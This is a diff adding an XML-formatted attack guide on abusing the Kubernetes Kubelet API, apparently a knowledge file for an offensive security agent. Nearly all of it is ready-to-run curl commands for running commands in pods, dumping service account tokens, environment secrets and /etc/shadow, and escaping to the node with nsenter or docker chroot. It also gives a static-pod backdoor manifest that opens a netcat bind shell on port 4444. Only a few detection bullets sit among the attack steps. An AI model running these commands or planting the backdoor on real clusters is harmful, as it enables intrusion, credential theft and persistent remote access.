@@ -1,0 +1,244 @@
+<vulnerability_guide>
+  <title>KUBELET API ABUSE</title>
+
+  <critical>The Kubelet runs on every Kubernetes node and exposes an API for pod management. Misconfigured Kubelets allow unauthenticated access to execute commands in pods, read secrets, and potentially escape to the node. Kubelet compromise from one pod can lead to lateral movement across all pods on that node.</critical>
+
+  <scope>
+    - Kubelet API authentication bypass
+    - Command execution in pods
+    - Secret and log access
+    - Pod creation and manipulation
+    - Node resource access
+    - Container runtime exploitation
+  </scope>
+
+  <methodology>
+    1. KUBELET DISCOVERY
+       {% raw %}
+       # Default Kubelet ports
+       10250 - Kubelet API (HTTPS)
+       10255 - Read-only API (HTTP, deprecated)
+       10248 - Health check
+
+       # Find Kubelet from pod
+       # Usually at node IP on 10250
+       env | grep KUBERNETES
+       cat /etc/hosts  # Node IP sometimes here
+
+       # Check Kubelet connectivity
+       curl -k https://NODE_IP:10250/pods
+
+       # Read-only port (if enabled)
+       curl http://NODE_IP:10255/pods
+       curl http://NODE_IP:10255/spec
+       {% endraw %}
+
+    2. AUTHENTICATION TESTING
+       {% raw %}
+       # Anonymous auth check
+       curl -k https://NODE_IP:10250/pods
+       # If returns pod list = anonymous auth enabled
+
+       # Service account token auth
+       TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+       curl -k -H "Authorization: Bearer $TOKEN" https://NODE_IP:10250/pods
+
+       # Client certificate auth
+       # Kubelet may trust cluster CA
+       curl --cacert ca.crt --cert client.crt --key client.key \
+         https://NODE_IP:10250/pods
+
+       # Node authorization mode
+       # If --authorization-mode=AlwaysAllow = no auth required
+       {% endraw %}
+
+    3. POD COMMAND EXECUTION
+       {% raw %}
+       # Execute command in pod via Kubelet
+       curl -k -X POST \
+         "https://NODE_IP:10250/run/{namespace}/{pod}/{container}" \
+         -d "cmd=id"
+
+       # Or using exec endpoint
+       curl -k -X POST \
+         "https://NODE_IP:10250/exec/{namespace}/{pod}/{container}?command=id&input=1&output=1&tty=1"
+
+       # Get shell
+       curl -k -X POST \
+         "https://NODE_IP:10250/run/default/nginx-pod/nginx" \
+         -d "cmd=cat /etc/passwd"
+
+       # Access all pods on the node
+       # First list pods
+       curl -k https://NODE_IP:10250/pods | jq '.items[].metadata.name'
+       {% endraw %}
+
+    4. SECRET ACCESS
+       {% raw %}
+       # Read pod environment (includes secrets)
+       curl -k -X POST \
+         "https://NODE_IP:10250/run/default/app-pod/app" \
+         -d "cmd=env"
+
+       # Read mounted secrets
+       curl -k -X POST \
+         "https://NODE_IP:10250/run/default/app-pod/app" \
+         -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+
+       # Read configmaps
+       curl -k -X POST \
+         "https://NODE_IP:10250/run/default/app-pod/app" \
+         -d "cmd=cat /etc/config/app.conf"
+
+       # All secrets on node
+       # Iterate through all pods
+       {% endraw %}
+
+    5. LOG ACCESS
+       {% raw %}
+       # Read container logs
+       curl -k https://NODE_IP:10250/containerLogs/{namespace}/{pod}/{container}
+
+       # Example
+       curl -k https://NODE_IP:10250/containerLogs/default/nginx/nginx
+
+       # Logs may contain:
+       # - Credentials
+       # - API keys
+       # - Internal URLs
+       # - Debug information
+       {% endraw %}
+  </methodology>
+
+  <advanced_techniques>
+    <container_escape>
+      {% raw %}
+      # From Kubelet access, escalate to node
+
+      # Find privileged container
+      curl -k https://NODE_IP:10250/pods | \
+        jq '.items[] | select(.spec.containers[].securityContext.privileged==true)'
+
+      # Exec into privileged container
+      curl -k -X POST \
+        "https://NODE_IP:10250/run/kube-system/privileged-pod/container" \
+        -d "cmd=nsenter -t 1 -m -u -n -i bash"
+
+      # Access host filesystem
+      curl -k -X POST \
+        "https://NODE_IP:10250/run/default/hostpath-pod/app" \
+        -d "cmd=cat /host/etc/shadow"
+      {% endraw %}
+    </container_escape>
+
+    <cri_socket_access>
+      {% raw %}
+      # Container Runtime Interface socket
+
+      # If mounted or accessible
+      # Docker socket: /var/run/docker.sock
+      # containerd socket: /var/run/containerd/containerd.sock
+      # CRI-O socket: /var/run/crio/crio.sock
+
+      # Via privileged container
+      curl -k -X POST \
+        "https://NODE_IP:10250/run/default/priv-pod/app" \
+        -d "cmd=docker ps"
+
+      # Create escaping container
+      docker run -v /:/host -it alpine chroot /host
+      {% endraw %}
+    </cri_socket_access>
+
+    <metrics_exploitation>
+      {% raw %}
+      # Kubelet metrics contain sensitive info
+
+      # Metrics endpoints
+      curl -k https://NODE_IP:10250/metrics
+      curl -k https://NODE_IP:10250/metrics/resource
+      curl -k https://NODE_IP:10250/metrics/probes
+      curl -k https://NODE_IP:10250/metrics/cadvisor
+
+      # Information revealed:
+      # - All pods on node
+      # - Resource usage patterns
+      # - Container configurations
+      # - Network connections
+      {% endraw %}
+    </metrics_exploitation>
+
+    <static_pod_manipulation>
+      {% raw %}
+      # Static pods defined on node filesystem
+
+      # Default location
+      /etc/kubernetes/manifests/
+
+      # If you can write to node filesystem:
+      # Add malicious static pod
+      cat > /etc/kubernetes/manifests/backdoor.yaml << EOF
+      apiVersion: v1
+      kind: Pod
+      metadata:
+        name: backdoor
+      spec:
+        hostNetwork: true
+        hostPID: true
+        containers:
+        - name: shell
+          image: alpine
+          securityContext:
+            privileged: true
+          command: ["/bin/sh", "-c", "while true; do nc -l -p 4444 -e /bin/sh; done"]
+      EOF
+
+      # Kubelet will automatically create the pod
+      {% endraw %}
+    </static_pod_manipulation>
+
+    <debug_handlers>
+      {% raw %}
+      # Kubelet debug endpoints
+
+      # pprof endpoints (may be enabled)
+      curl -k https://NODE_IP:10250/debug/pprof/
+      curl -k https://NODE_IP:10250/debug/flags/
+
+      # Spec endpoint
+      curl -k https://NODE_IP:10250/spec/
+
+      # ConfigZ (kubelet config)
+      curl -k https://NODE_IP:10250/configz
+      # May reveal security settings
+      {% endraw %}
+    </debug_handlers>
+  </advanced_techniques>
+
+  <detection>
+    - Monitor Kubelet API access logs
+    - Alert on unauthenticated connections
+    - Track /run and /exec endpoint usage
+    - Monitor for new static pod files
+    - Check Kubelet --anonymous-auth setting
+  </detection>
+
+  <validation>
+    - Successfully access Kubelet API
+    - Execute commands in pods on node
+    - Extract secrets from pods
+    - Access container logs
+    - Demonstrate lateral movement capability
+  </validation>
+
+  <pro_tips>
+    - Default Kubelet allows token auth - try pod's service account token
+    - Read-only port 10255 often enabled for monitoring (great for recon)
+    - kube-system namespace pods often have elevated privileges
+    - etcd pods expose etcd certificates in environment
+    - Static pod manifests persist even if kubectl deleted pod
+    - Check for --anonymous-auth=true in Kubelet args
+  </pro_tips>
+
+  <remember>The Kubelet is your gateway to every pod on a node. With anonymous auth (common misconfiguration), you can execute commands in any pod, read any secret mounted in those pods, and potentially escape to the node. From inside a pod, the Kubelet on the host node (often 10250 on the node IP) is your first escalation target.</remember>
+</vulnerability_guide>
